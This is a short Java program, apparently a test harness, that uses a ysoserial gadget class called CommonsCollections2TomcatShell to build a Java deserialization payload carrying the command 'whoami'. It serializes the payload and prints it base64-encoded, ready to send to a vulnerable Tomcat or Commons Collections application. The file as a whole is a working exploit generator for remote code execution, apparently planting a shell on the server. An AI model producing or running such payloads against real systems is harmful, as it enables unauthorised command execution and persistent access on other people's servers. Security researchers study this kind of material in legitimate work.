import sun.misc.BASE64Encoder;
import ysoserial.payloads.CommonsCollections2TomcatShell;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Queue;

public class demotest {
    public static void main(String[] args) {
        CommonsCollections2TomcatShell commonsCollections2TomcatShell = new CommonsCollections2TomcatShell();
        try {
            Queue<Object> payload = commonsCollections2TomcatShell.getObject("whoami");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream bos = new ObjectOutputStream(byteArrayOutputStream);
            bos.writeObject(payload);
            byte[] bytes = byteArrayOutputStream.toByteArray();
            String encode = new BASE64Encoder().encode(bytes);
            System.out.println(encode.replaceAll("\r\n",""));


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
